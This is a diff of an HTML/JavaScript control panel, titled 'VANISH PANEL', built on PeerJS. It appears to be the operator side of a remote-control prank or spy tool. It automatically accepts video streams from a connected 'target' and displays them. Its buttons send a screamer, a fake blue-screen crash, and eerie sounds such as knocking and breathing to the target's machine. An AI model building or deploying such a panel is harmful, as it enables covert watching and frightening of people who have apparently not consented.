@@ -1,53 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TERMINAL PRO</title>
+    <title>VANISH PANEL</title>
+    <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; }
-        #side { width: 250px; padding: 20px; border-right: 1px solid #222; background: #0a0a0a; height: 100vh; }
-        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 15px; }
-        video { width: 100%; border: 1px solid #0f0; border-radius: 5px; background: #000; }
-        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; }
+        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
+        #side { width: 300px; background: #0a0a0a; border-right: 1px solid #222; padding: 20px; }
+        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; background: #000; overflow-y: auto; }
+        video { width: 100%; border: 2px solid #333; border-radius: 10px; background: #111; }
+        .btn { padding: 15px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; text-transform: uppercase; }
         .btn:hover { background: #0f0; color: #000; }
-        .btn-red { border-color: #ff0050; color: #ff0050; }
+        .btn-red { color: #ff0050; border-color: #ff0050; }
         .btn-red:hover { background: #ff0050; color: #fff; }
     </style>
 </head>
 <body>
+    <audio id="notif" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>
+
     <div id="side">
-        <h2 style="color: #ff0050;">PANEL</h2>
-        <div id="st">STATUS: STARTING...</div>
-        <hr border="1" color="#222" style="margin: 20px 0;">
+        <h2 style="color: #ff0050;">TERMINAL</h2>
+        <div id="status" style="border: 1px solid #333; padding: 10px; margin-bottom: 20px;">ОЖИДАНИЕ...</div>
         <button class="btn btn-red" onclick="send('SCR')">💀 СКРИМЕР</button>
-        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК В ДВЕРЬ</button>
+        <button class="btn" onclick="send('BSOD')">💻 СИНИЙ ЭКРАН</button>
+        <p>ЗВУКИ:</p>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
         <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
     </div>
+
     <div id="monitor"></div>
 
     <script>
-        const peer = new Peer('STABLE_777');
-        let activeConn;
+        const MY_ID = '09062012';
+        const peer = new Peer(MY_ID);
+        let activeConn = null;
 
-        peer.on('open', () => document.getElementById('st').innerText = "STATUS: ONLINE");
-        
-        peer.on('connection', c => {
-            activeConn = c;
-            document.getElementById('st').innerText = "STATUS: CONNECTED";
+        peer.on('connection', conn => {
+            activeConn = conn;
+            document.getElementById('notif').play();
+            document.getElementById('status').innerText = "ЦЕЛЬ В СЕТИ";
+            document.getElementById('status').style.color = "#0f0";
         });
 
         peer.on('call', call => {
             call.answer();
             call.on('stream', stream => {
-                const v = document.createElement('video');
-                v.autoplay = true;
-                v.srcObject = stream;
-                document.getElementById('monitor').appendChild(v);
+                const video = document.createElement('video');
+                video.autoplay = true;
+                video.srcObject = stream;
+                document.getElementById('monitor').appendChild(video);
             });
         });
 
         function send(t) { if(activeConn) activeConn.send({ type: t }); }
         function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
+        window.onclick = () => { console.log("System Online"); };
     </script>
 </body>
 </html>
